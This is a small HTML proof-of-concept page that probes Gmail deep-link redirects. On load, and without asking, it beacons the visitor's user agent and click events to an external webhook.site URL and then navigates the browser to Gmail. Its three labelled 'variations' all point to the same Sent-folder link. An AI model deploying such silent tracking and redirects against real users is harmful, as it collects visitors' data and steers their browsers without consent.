<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Gmail Intent Deep Link PoC</title>
</head>
<body>
<h3>Gmail Intent Test Running...</h3>

<script>
const WEBHOOK = "https://webhook.site/cc134afb-98c9-4219-8ed2-5b7fae0eafc0";

// 🔥 logging reliable
function report(data) {
    const payload = encodeURIComponent(JSON.stringify({
        time: Date.now(),
        ua: navigator.userAgent,
        ...data
    }));

    const img = new Image();
    img.src = WEBHOOK + "?d=" + payload;
}

// 🎯 Gmail intent variations (safe testing)
const intents = [
    {
        name: "basic_compose",
        uri: "https://mail.google.com/mail/u/0/#sent"
    },
    {
        name: "with_subject",
        uri: "https://mail.google.com/mail/u/0/#sent"
    },
    {
        name: "with_body",
        uri: "https://mail.google.com/mail/u/0/#sent"
    }
];

// 🔥 run single test
function runTest(intentObj, index) {
    report({
        event: "intent_attempt",
        name: intentObj.name,
        index
    });

    try {
        window.location.href = intentObj.uri;
    } catch (e) {
        report({
            event: "intent_error",
            name: intentObj.name,
            index
        });
    }

    // fallback timeout detection
    setTimeout(() => {
        report({
            event: "intent_timeout",
            name: intentObj.name,
            index
        });
    }, 2500);
}

// 🔥 sequential runner
function runAll() {
    let delay = 0;

    intents.forEach((intentObj, i) => {
        setTimeout(() => {
            runTest(intentObj, i);
        }, delay);

        delay += 4000; // spacing biar tidak ketabrak
    });
}

// 🔍 detect user interaction
document.addEventListener("click", () => {
    report({ event: "user_click_detected" });
});

// 🔥 auto trigger
window.onload = () => {
    report({ event: "page_loaded" });

    setTimeout(() => {
        report({ event: "auto_trigger_start" });
        runAll();
    }, 1000);
};
</script>

</body>
</html>
